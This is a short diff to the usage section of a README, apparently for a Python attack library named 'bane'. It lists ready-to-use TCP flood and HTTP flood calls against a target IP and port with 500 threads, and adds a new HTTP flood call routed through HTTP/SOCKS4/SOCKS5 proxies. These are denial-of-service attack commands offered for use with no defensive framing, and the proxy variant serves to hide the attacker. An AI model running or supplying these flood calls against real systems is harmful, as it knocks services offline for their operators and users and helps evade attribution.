@@ -119,3 +119,5 @@ II-Usage:
 <br>bane.tcp_flood(IP, p= port , min_size=10, max_size=20 , duration= 300 ,interval=0.001 , threads=500)
 <h4>HTTP FLOOD:</h4>
 <br>bane.http_flood(IP, p= port , duration= 300 ,interval=0.001 , threads=500)
+<h4>HTTP FLOOD using proxies (HTTP/SOCKS4/SOCKS5):</h4>
+<br>bane.prox_http_flood(IP, p= port , duration= 300 ,interval=0.001 , threads=500)
